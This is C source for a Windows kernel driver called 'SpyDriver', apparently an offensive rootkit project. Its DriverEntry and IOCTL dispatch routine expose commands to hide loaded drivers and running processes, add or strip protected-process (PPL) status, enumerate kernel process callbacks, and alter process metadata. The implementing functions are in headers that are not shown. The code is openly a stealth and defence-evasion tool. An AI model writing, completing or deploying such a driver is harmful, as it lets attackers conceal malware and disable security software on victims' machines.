#include "processops.h"
#include "driverops.h"
#include "tokenops.h"
#include "pplops.h"
#include "callbackops.h"
// ---------------------------------------------------------------
// main driver routines
// ---------------------------------------------------------------
// DriverEntry Point
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)

{
    UNREFERENCED_PARAMETER(RegistryPath);

    UNICODE_STRING deviceName, symLinkName;
    NTSTATUS status;
    PDEVICE_OBJECT deviceObject = NULL;

    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);

    // Create device
    status = IoCreateDevice(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &deviceObject
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Failed to create device: 0x%X\n", status);
        return status;
    }

    DbgPrint("[+] Device created successfully %wZ\n", &deviceName);

    // Create symbolic link
    status = IoCreateSymbolicLink(&symLinkName, &deviceName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Failed to create symbolic link: 0x%X\n", status);
        IoDeleteDevice(deviceObject);
        return status;
    }

    DbgPrint("[+] Symbolic link created successfully %wZ -> %wZ\n", &symLinkName, &deviceName);

    // Set up dispatch functions
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DeviceCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DeviceClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
    DriverObject->DriverUnload = DriverUnload;

    // Set device flags
    deviceObject->Flags |= DO_BUFFERED_IO;
    deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    DbgPrint("[+] Driver loaded successfully\n");
    DbgPrint("[+] SpyDriver ready at \\\\.\\SpyDriverLink\n");

    return STATUS_SUCCESS;
}

// Unload routine
VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING symLinkName;
    RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);

    IoDeleteSymbolicLink(&symLinkName);

    if (DriverObject->DeviceObject) {
        IoDeleteDevice(DriverObject->DeviceObject);
    }

    DbgPrint("[+] Driver unloaded successfully\n");
}

// Create handler
NTSTATUS DeviceCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    DbgPrint("[+] Handle opened (CreateFile called)\n");

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

// Close handler
NTSTATUS DeviceClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    DbgPrint("[+] Handle closed (CloseHandle called)\n");

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}


// ---------------------------------------------------------------
// IOCTL Control handler
// ---------------------------------------------------------------
NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    DbgPrint("[+] IOCTL received\n");

    PIO_STACK_LOCATION stackLocation;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG ioControlCode;
    ULONG inBufferLength, outBufferLength;
    PVOID buffer;
    ULONG_PTR bytesReturned = 0;

    // Get the current stack location
    stackLocation = IoGetCurrentIrpStackLocation(Irp);
    ioControlCode = stackLocation->Parameters.DeviceIoControl.IoControlCode;

    buffer = Irp->AssociatedIrp.SystemBuffer;
    inBufferLength = stackLocation->Parameters.DeviceIoControl.InputBufferLength;
    outBufferLength = stackLocation->Parameters.DeviceIoControl.OutputBufferLength;

    DbgPrint("[*] IOCTL Code: 0x%X\n", ioControlCode);

    switch (ioControlCode)
    {
    case IOCTL_SPY_DLIST:
    {
        DbgPrint("[*] IOCTL_SPY_DLIST received\n");

        if (outBufferLength < 1024) {
            DbgPrint("[-] Output buffer too small\n");
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }

        status = SpyIoEnumerateLoadedDrivers(
            buffer,
            outBufferLength,
            &bytesReturned
        );

        break;
    }
    case IOCTL_SPY_PLIST:
    {
        DbgPrint("[*] IOCTL_SPY_PLIST received\n");
        if (outBufferLength < 1024) {
            DbgPrint("[-] Output buffer too small\n");
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        status = SpyIoEnumerateRunningProcess(
            buffer,
            outBufferLength,
            &bytesReturned
        );
        break;
	}

    case IOCTL_SPY_DHIDE:
    {
        DbgPrint("[*] IOCTL_SPY_DHIDE received\n");
        if (inBufferLength < sizeof(SPY_HIDE_INPUT)) {
            DbgPrint("[-] Input buffer too small\n");
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        status = SpyIoHideDriver(
            buffer,
            outBufferLength,
            &bytesReturned
        );
        break;
	}


    case IOCTL_SPY_PHIDE:
    {
        DbgPrint("[*] IOCTL_SPY_PHIDE received\n");
        if (inBufferLength < sizeof(SPY_HIDE_INPUT)) {
            DbgPrint("[-] Input buffer too small\n");
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        status = SpyIoHideProcessById(
            buffer,
            outBufferLength,
            &bytesReturned
        );
        break;
    }

    case IOCTL_SPY_UPDATE:
    {
        DbgPrint("[*] IOCTL_SPY_UPDATE received\n");
        if (inBufferLength < sizeof(SPY_HIDE_INPUT)) {
            DbgPrint("[-] Input buffer too small\n");
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        status = SpyIoSyncProcessMetadataById(
            buffer,
            outBufferLength,
            &bytesReturned
        );
        break;
    }

    case IOCTL_SPY_PPL:
    {
        DbgPrint("[*] IOCTL_SPY_PLL received\n");
        if (inBufferLength < sizeof(SPY_HIDE_INPUT)) {
            DbgPrint("[-] Input buffer too small\n");
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        status = SpyIoSetProcessProtection(
            buffer,
            outBufferLength,
            &bytesReturned
        );
        break;
    }

    case IOCTL_SPY_UNPPL:
    {
        DbgPrint("[*] IOCTL_SPY_UNPLL received\n");
        if (inBufferLength < sizeof(SPY_HIDE_INPUT)) {
            DbgPrint("[-] Input buffer too small\n");
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        status = SpyIoRemoveProcessProtection(
            buffer,
            outBufferLength,
            &bytesReturned
        );
        break;
    }

    case IOCTL_SPY_CALLBACK:
        DbgPrint("[*] IOCTL_SPY_CALLBACK received\n");
        if (outBufferLength < 1024) {
            DbgPrint("[-] Output buffer too small\n");
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        status = SpyIoEnumerateProcessCallbacks(
            buffer,
            outBufferLength,
            &bytesReturned
        );
        break;

    case IOCTL_SPY_PATCH:
        DbgPrint("[*] IOCTL_SPY_PATCH received\n");
        // TODO: Implement
        break;

    default:
        DbgPrint("[!] Unknown IOCTL: 0x%X\n", ioControlCode);
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesReturned;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

